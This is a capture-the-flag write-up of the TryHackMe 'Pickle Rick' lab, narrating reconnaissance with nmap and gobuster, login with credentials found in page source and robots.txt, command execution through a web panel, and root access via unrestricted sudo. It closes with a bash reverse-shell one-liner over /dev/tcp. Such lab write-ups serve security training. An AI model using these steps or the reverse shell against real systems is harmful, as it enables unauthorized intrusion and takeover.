# TryHackMe - [Pickle Rick Room](https://tryhackme.com/room/picklerick)

## Easy rated, CTF style lab, based on the television show Rick and Morty.

In this Rick and Morty themed lab, users are challenged to exploit a web server to find 3 ingredients that will help Rick make a potion that will transform him from pickle to human.

First, after starting the machine, I run Nmap to see what ports are open and save the results to a file called initial_scan.

![nmap1](https://user-images.githubusercontent.com/90977933/133953217-d124f8bc-3925-4df8-beb7-5b187ef3f915.png)


With only two open ports, 22 and 80, I use the -A flag in Nmap on those two ports to get additional information about the ports and victim machine.


![nmap2](https://user-images.githubusercontent.com/90977933/133953522-7c26e090-af6b-49ee-a735-68f8f7720231.png)

![nmap3](https://user-images.githubusercontent.com/90977933/133953528-52df3b14-3adf-4503-bec3-2815fafd5255.png)


From our results I can see the victim machine is running Linux Ubuntu and that there is an Apache web server and webpage on port 80.


### visiting the webpage!


![browser1](https://user-images.githubusercontent.com/90977933/133953712-b398f2b4-c2bc-4bec-be40-27850a845135.png)


**Here begins the start of the story.** The webpage is a note from Rick to Morty explaining that he has turned himself into a pickle again and needs Morty's help to turn back. He tells Morty to log into his computer and find the last three secret ingredients needed for his "pickle-reverse potion", but he has no idea what the password is. 

My first thought is to look at the source code of the webpage to see if there is anything useful.

![browser1_sc](https://user-images.githubusercontent.com/90977933/133953942-66b0f19e-6132-4a2c-9b56-7ec3b1c873e7.png)


AH HA! In the source code there is a username commented out by rick  **R1ckRul3s**. 



As a general good practice, I always check to see if the webpage has a robots.txt before moving on, **and it does!**


![robots1](https://user-images.githubusercontent.com/90977933/133954105-3ace493c-e4f6-4e9c-9ba2-af68d5c1b63f.png)


In the roboots.txt file the only thing here is "wubbalubbadubdub". Into the lab notes It goes.

Just to rule it out, I try to use the username we found in the page source and the string I found in the robots.txt, as a username and password combo on the open ssh port. Unfortunately with no success. On we go.


Next, I run gobuster to see if there are any hidden directories or redirects.


![gobuster1](https://user-images.githubusercontent.com/90977933/133954242-e400a294-5c6f-4475-8146-5838d30edec6.png)


In the gobuster results there are two 302 redirects to a /login.php directory. 


![gobuster2](https://user-images.githubusercontent.com/90977933/133954263-852e4387-2812-4112-a9e2-487b4e183982.png)


I visit the login.php to find a login portal and try the same username and password combination I used earlier for SSH.

### Success!


![portal1](https://user-images.githubusercontent.com/90977933/133954393-0f5fc69b-4d0a-44c9-af92-ff62d573973e.png)


After clicking around on the website and viewing the source code, I find all except for the Commands page, redirects to a denied.php with a message that only the REAL rick can view this page.
Since I know the machine we are connected to is a linux machine, I enter the *whoami* command on the Command Panel page to see what happens.

![command1](https://user-images.githubusercontent.com/90977933/133954466-ce87b84b-5933-48de-93f4-5d34c471a9c1.png)


Printed to our screen I see the output www-data and with that i think it's safe to say we are interacting directly with the server through this page.

![command2](https://user-images.githubusercontent.com/90977933/133954474-8bf1c555-3c95-4eb2-bc1f-aa588688d449.png)

I assume then that I am in the /var/www/html folder and run *ls -la* where I find there is a file called **Sup3rS3cretPickl3Ingred.txt.** Since it is in this directory I visit that page in the browser and find our **first flag.**

Trying to use the *cat* command showed that it is disabled along with more.

![disabled](https://user-images.githubusercontent.com/90977933/133954528-740b4f27-ecc7-43c3-9282-be5eed242025.png)


Looking into the disabled page source code I find a comment that looks like base64 encoding.

![disabled2](https://user-images.githubusercontent.com/90977933/133954648-214b9bf8-7746-4ae5-84e4-16720e694a4f.png)

After decoding a few times I realized the string was getting smaller and smaller which led me to believe it may have been a password.
It was not... rabbit hole...

Getting back on track! I go back to the command page and try some directory traversal to see what other information I can find. Using *ls -la ../../../home* I find users rick and ubuntu. I later found that it was unnecessary to use ../ since we we are interacting directly with the server and there were no checks outside of dissalowed commands and regular file permissions. 



![traversal1](https://user-images.githubusercontent.com/90977933/133954687-a1f3d5b1-c54c-4877-bcee-309d592aa72c.png)



Inside of the rick directory, there is a file called second ingredients.


![traversal2](https://user-images.githubusercontent.com/90977933/133954701-2c76686c-5ca8-4c7a-9b0e-82943caeb1f4.png)


Since *cat* is disabled I tried the *more* command with no luck. Next option is the *less* command.


![traversal3](https://user-images.githubusercontent.com/90977933/133954865-273d3e6c-6442-4b94-9ec9-5698603ca941.png)


**BAM! There is our second flag.**

I assume now the 3rd and final flag is in the machines root folder. Typically I would try to get a shell on the machine but since we can execute commands here, lets see what we can do here first.

Since it is the www-data user interacting with the server. I check to see what permissions www-data has using *sudo -l* command.



![root1](https://user-images.githubusercontent.com/90977933/133954924-3758cc56-8fbf-4a85-ac94-27e28bafaa70.png)



Luckily for us user www-data can run **ALL COMMANDS WITH NO PASSWORD!!!** So now I *sudo -ls -la* the contents of the **/root** folder



![root2](https://user-images.githubusercontent.com/90977933/133955038-60a10422-da07-4532-9ec8-2542afcdc905.png)



And like before, I used the *less* command to view the contents of file **3rd.txt** for the third and final flag.



![root3](https://user-images.githubusercontent.com/90977933/133955061-677b23f5-a661-44ee-8115-c8a7e1d33eb8.png)


This lab was a quick and easy room that didn't require you to gain access to retrieve the final flag. 
I did go back and try to gain access using a reverse shell and had success with executing 

**Bash -c \'bash -I >& /dev/tcp/IP address/8080 0>&1\'**

in the command webpage. From there it was the same sudo commands to find the final flag.

-Simon
